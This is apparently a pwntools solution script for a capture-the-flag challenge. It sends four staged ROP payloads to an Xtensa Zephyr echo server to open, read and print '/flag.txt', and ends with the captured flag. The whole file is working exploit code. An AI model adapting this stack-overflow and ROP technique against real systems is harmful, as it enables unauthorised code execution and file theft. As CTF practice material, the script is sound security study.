#!/usr/bin/env python3
from pwn import *

context.terminal = ["/usr/bin/kitty"]
context.encoding = 'latin'
context.log_level = "debug"
context.bits = 32

elf = ELF("./zephyr.elf", checksec=False)
# context.binary = elf = ELF("./src/redis-lite-server", checksec=False)
# libc = ELF("./libc.so.6")

gs = """
b main
c
"""

HOST, PORT = "xtensable-echoserver.flu.xxx", 1024
# HOST, PORT = "localhost", 1024

p = remote(HOST, PORT)
# p = process("./run.sh".split())
# p = process("./run.sh -s -S".split())
# p = gdb.debug(elf.file.name, gdbscript=gs)

"""
0x801003d5	0x0013d340	0x00000001	0x00000008
0x00000000	0x00103a9c	0x00103a9c	0x00103a9c
0x801003f6	0x0013d370	0x001002e4	0x00141000
0x00000031	0x0013d400	0x00101bac	0x00141000
"""

simcall_addr = 0x1023e3
call_read_line = 0x0010039d
retwn = 0x100384

print("stage 1")
stack_1 = 0x0013d340
payload = flat(
    # 'a' * 4,
    # 'b' * 4,
    0x801003d5,
    stack_1,
    'c' * 4,
    'd' * 4,
    'e' * 4,
    'f' * 4,
    'g' * 4,
    'h' * 4,
    # 'i' * 4,
    # 'j' * 4,
    simcall_addr | 0x80000000,
    stack_1 + 0x20,
    'k' * 4,
    'l' * 4,
    "/flag.txt\x00\x00\x00",
    # 'm' * 4,
    # '2' * 4,
    # 0x13d340-8-4,
    # 0x200,
    # 'n' * 4,
    'o' * 4,
    # 'p' * 4,
    elf.sym['main'] | 0x80000000,
    # 'q' * 4,
    stack_1 + 0x30,
    # 'r' * 4,
    # 's' * 4,
    5,               # arg 1: syscall no
    stack_1 - 0x18,  # arg 2: flag.txt str ptr
    't' * 4,
    # 'u' * 4,
    stack_1 + 0x50,
    'v' * 4,
    'w' * 4,
    # 'x' * 4,
    0, 0,            # arg 3, arg 4

    # 'y' * 4,
    'z' * 4,
)

print(f"len(payload) = {len(payload)}")

p.sendlineafter(b"exit", "1")
p.sendlineafter(b"echo: ", payload)


p.sendlineafter(b"exit", "2")



print("stage 2")

# open flag second time so fd is not 0xa
stack_1 = 0x0013d320
payload = flat(
    # 'a' * 4,
    # 'b' * 4,
    0x801003d5,
    stack_1,
    'c' * 4,
    'd' * 4,
    'e' * 4,
    'f' * 4,
    'g' * 4,
    'h' * 4,
    # 'i' * 4,
    # 'j' * 4,
    simcall_addr | 0x80000000,
    stack_1 + 0x20,
    'k' * 4,
    'l' * 4,
    "/flag.txt\x00\x00\x00",
    # 'm' * 4,
    # '2' * 4,
    # 0x13d340-8-4,
    # 0x200,
    # 'n' * 4,
    'o' * 4,
    # 'p' * 4,
    elf.sym['main'] | 0x80000000,
    # 'q' * 4,
    stack_1 + 0x30,
    # 'r' * 4,
    # 's' * 4,
    5,               # arg 1: syscall no
    stack_1 - 0x18,  # arg 2: flag.txt str ptr
    't' * 4,
    # 'u' * 4,
    stack_1 + 0x50,
    'v' * 4,
    'w' * 4,
    # 'x' * 4,
    0, 0,            # arg 3, arg 4

    # 'y' * 4,
    'z' * 4,
)

print(f"len(payload) = {len(payload)}")

p.sendlineafter(b"exit", "1")
p.sendlineafter(b"echo: ", payload)


p.sendlineafter(b"exit", "2")


print("stage 3")
stack_2 = 0x0013d300
stage2 = flat(
    # 'a' * 4,
    # 'b' * 4,
    0x801003d5,
    stack_2,
    'c' * 4,
    'd' * 4,
    'e' * 4,
    'f' * 4,
    'g' * 4,
    'h' * 4,
    # 'i' * 4,
    # 'j' * 4,
    simcall_addr | 0x80000000,
    stack_2 + 0x20,
    'k' * 4,
    'l' * 4,
    "/flag.txt\x00\x00\x00",
    # 'm' * 4,
    # '2' * 4,
    # 0x13d340-8-4,
    # 0x200,
    # 'n' * 4,
    'o' * 4,
    # 'p' * 4,
    elf.sym['main'] | 0x80000000,
    # 'q' * 4,
    stack_2 + 0x30,
    # 'r' * 4,
    # 's' * 4,
    3,               # arg 1: syscall no
    0x9,               # arg 2: flag.txt fd
    't' * 4,
    # 'u' * 4,
    stack_2 + 0x50,
    'v' * 4,
    'w' * 4,

    # 'x' * 4,
    stack_2 - 0x600,            # arg 3
    # 'y' * 4,
    0x111,            # arg 4

    'z' * 4,
)

print(f"len(payload) = {len(stage2)}")

p.sendlineafter(b"exit", "1")
p.sendlineafter(b"echo: ", stage2)


p.sendlineafter(b"exit", "2")


print("stage 4")
stack_3 = 0x0013d300-0x20
stage3 = flat(
    # 'a' * 4,
    # 'b' * 4,
    0x801003d5,
    stack_3,
    'c' * 4,
    'd' * 4,
    'e' * 4,
    'f' * 4,
    'g' * 4,
    'h' * 4,
    # 'i' * 4,
    # 'j' * 4,
    simcall_addr | 0x80000000,
    stack_3 + 0x20,
    'k' * 4,
    'l' * 4,
    "/flag.txt\x00\x00\x00",
    # 'm' * 4,
    # '2' * 4,
    # 0x13d340-8-4,
    # 0x200,
    # 'n' * 4,
    'o' * 4,
    # 'p' * 4,
    elf.sym['main'] | 0x80000000,
    # 'q' * 4,
    stack_3 + 0x30,
    # 'r' * 4,
    # 's' * 4,
    4,               # arg 1: syscall no
    1,               # arg 2: flag.txt fd
    't' * 4,
    # 'u' * 4,
    stack_3 + 0x50,
    'v' * 4,
    'w' * 4,

    # 'x' * 4,
    stack_2 - 0x600,            # arg 3
    # 'y' * 4,
    0x111,            # arg 4

    'z' * 4,
)

print(f"len(payload) = {len(stage3)}")

p.sendlineafter(b"exit", "1")
p.sendlineafter(b"echo: ", stage3)


p.sendlineafter(b"exit", "2")



p.interactive()


"""
b *0x10035c
"""
# flag{0h_do1n9_s0m3_r0p_0n_xt3ns4}